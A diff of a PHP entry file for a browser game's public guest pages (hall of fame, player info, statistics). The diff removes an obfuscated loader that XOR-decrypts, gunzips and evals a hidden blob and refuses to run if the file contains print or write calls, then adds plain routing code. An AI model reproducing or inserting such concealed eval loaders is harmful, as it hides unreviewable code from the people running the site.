@@ -1,24 +1,72 @@
 <?php
-$bnbjvzoad="5ad9d6a4f0473bd8a1c482e691b33bbc";
-$sqwxtqx="0457055b00015250550255010a00515b04005403005701055d54520603070002";
-$htplewl="SeyMNKlZ71IjjIofn+I1MoxLomkrXeJSCBuwLQaz3zQ0dzJBSWwdzaOmAhXPscGzNr6O04JKshLBEObeY2ShqZA0N0lpDuyYTwFCYCwWNplV3mAKJKXVd4tIxK5f8jgoOjT1C8lsuKnsqc7emNOFfWns7kyZUFAxuu+FrfGnZXAHyZnCwMdWMmZC71iUYPfEZNB9Ti3hbTeEFD3nqkWCa84mCkI/+UVKau/j+YpuqNDrCtuaM68QX6Vy+9DpdwwA8Pnu9XO8xxBBhL1rAVsOXprBRqWsyldWcJIobeFNvQpA9XLIS1Fj2B9aXIxAXjHIyFnnUozi79rxKUf/NxHOfL06q3gEjuemyCDfUnk161gJ5AIrehS4xBE4jCv18qBCXqLCZ94sgiJ1CdousnQnOjTkm1lGy6/p2x0FSqEys3zLR59Unvn4dtViNcVAR8/dR+UmYZtEICx4WID8Rlz4NRwGO1IW6lwzVQJbDXLoEJ8RST8Yj/uj+AV9rCzFikRyP4NpiG5OYenltCr0XG2VxU1qkqZOGetFehjLKxSA4aO7h4yjwt9R1V4R6uh+Vru08UH4JUyctOQr5kINKrjYHQbHlvOstdPgwuNr540g6MCW6JPylUQbreTsxxZewOeIN+dAfWmSY6JpOT1tEFaHiz/fkvT8/JaCYhbOW8GODaQZGx9NhT/FIMM4a7zaLR8Ur3zJ7gK4iJhDhDPYeXf3Hhjw9f7uKRo8IJrCJn8aOh6PduJvQnEqs3xerUNgXjzIdwJX6TjrCCoWQY455bz34OAkQgiPSAv6NNQVXgeALTDNEVVF+OIJws5QbZWzAdLPwJC0lFxPwVta3auomqyH3AdTsIIDn1D73VK3JV/fuqqj1XiCJkrwGN/uSMX2xMP48JBcFURyo09Tx4NsW/0/UqLsFVksV6pqdYKUqiM3yVuvECx4LnI5+HuW3io2vEF7K7gonQsz8sRRapgIDkdLL1kohnne8HfBdriO0GA7T3RaGCj/zLb1h2OcLw2ql1Nil3pJ1cmTUbMvL7BuxXMN7/XFpqPGVOf6vtaCQqH5wy6ISVuYkgZMiC2pIV+hTKTx6aO7vkkLPutZnDAoYC282fxp96xSQ21ux4tiJWaL6ScRoCwc6gqgzEeXCd37m2eerlXJ";
-$zvgtocbv=file_get_contents(__FILE__);
-$msceyutvr=str_replace($htplewl,"",$zvgtocbv);
-if(strpos($msceyutvr,"ec"."ho")!==false||strpos($msceyutvr,"pr"."int")!==false||strpos($msceyutvr,"var_"."dump")!==false||strpos($msceyutvr,"file_put_"."contents")!==false||strpos($msceyutvr,"fw"."rite")!==false){die();}
-$jynvkmwiqb=str_replace(array($bnbjvzoad,$sqwxtqx),array("SP_d0f9a6c9","KP_798da608"),$zvgtocbv);
-$vgrwzbxk=md5($jynvkmwiqb);
-$jjvdirtjyb=hex2bin($sqwxtqx);
-$slneqo="";
-$lsaauaf=strlen($vgrwzbxk);
-for($srscdluxch=0;$srscdluxch<$lsaauaf;$srscdluxch++){
-$slneqo.=chr(ord($jjvdirtjyb[$srscdluxch])^ord($vgrwzbxk[$srscdluxch]));
+// guest.php - Acesso público a informações do mundo (Hall da Fama, Estatísticas)
+// Permite que visitantes sem conta vejam o progresso do mundo.
+
+// error_reporting(E_ERROR | E_PARSE | E_CORE_ERROR | E_COMPILE_ERROR);
+// ini_set('display_errors', '0');
+/*****************************************/
+/*            GUEST.PHP                  */
+/*             GUEST                     */
+/*             ice41                     */
+/*****************************************/
+// Autoloader
+spl_autoload_register(function ($class) {
+    $prefix = 'App\\';
+    $base_dir = __DIR__ . '/../app/';
+
+    $len = strlen($prefix);
+    if (strncmp($prefix, $class, $len) !== 0) {
+        return;
+    }
+
+    $relative_class = substr($class, $len);
+    $file = $base_dir . str_replace('\\', '/', $relative_class) . '.php';
+
+    if (file_exists($file)) {
+        require $file;
+    }
+});
+
+// Load translation helpers
+require_once(__DIR__ . '/../app/Helpers/language_helper.php');
+init_locale();
+
+$screen = isset($_GET['screen']) ? $_GET['screen'] : 'ranking';
+$world = isset($_GET['world']) ? $_GET['world'] : '1';
+
+// Mapeamento de screens permitidos para acesso de convidado
+if ($screen === 'ranking' || $screen === 'hall_of_fame') {
+    require_once __DIR__ . '/../app/Controllers/Screens/HallOfFameScreen.php';
+    try {
+        $controller = new \App\Controllers\Screens\HallOfFameScreen($world);
+        echo $controller->render();
+    } catch (\Exception $e) {
+        die(__('stats.config_load_error') . ': ' . $e->getMessage());
+    }
+} elseif ($screen === 'info_player' || $screen === 'info_ally') {
+    require_once __DIR__ . '/../app/Controllers/Screens/GuestInfoScreen.php';
+    try {
+        $controller = new \App\Controllers\Screens\GuestInfoScreen($world);
+        echo $controller->render($screen, (int)($_GET['id'] ?? 0));
+    } catch (\Exception $e) {
+        die(__('stats.config_load_error') . ': ' . $e->getMessage());
+    }
+} elseif ($screen === 'statisics' || $screen === 'stats') {
+    require_once __DIR__ . '/../app/Controllers/Screens/StatisticsScreen.php';
+    try {
+        $controller = new \App\Controllers\Screens\StatisticsScreen($world);
+        echo $controller->render();
+    } catch (\Exception $e) {
+        die(__('stats.config_load_error') . ': ' . $e->getMessage());
+    }
+} else {
+    // Redireciona para o Hall da Fama por padrão se a tela não for reconhecida
+    require_once __DIR__ . '/../app/Controllers/Screens/HallOfFameScreen.php';
+    try {
+        $controller = new \App\Controllers\Screens\HallOfFameScreen($world);
+        echo $controller->render();
+    } catch (\Exception $e) {
+        die(__('stats.config_load_error') . ': ' . $e->getMessage());
+    }
 }
-$fbnpszf=base64_decode($htplewl);
-$rzgnvl=strlen($fbnpszf);
-$xuqaijy="";
-$enstokf=strlen($slneqo);
-for($srscdluxch=0;$srscdluxch<$rzgnvl;$srscdluxch++){
-$xuqaijy.=$fbnpszf[$srscdluxch]^$slneqo[$srscdluxch%$enstokf];
-}
-$cpjzyt="gzun"."compress";
-eval($cpjzyt($xuqaijy));
+?>
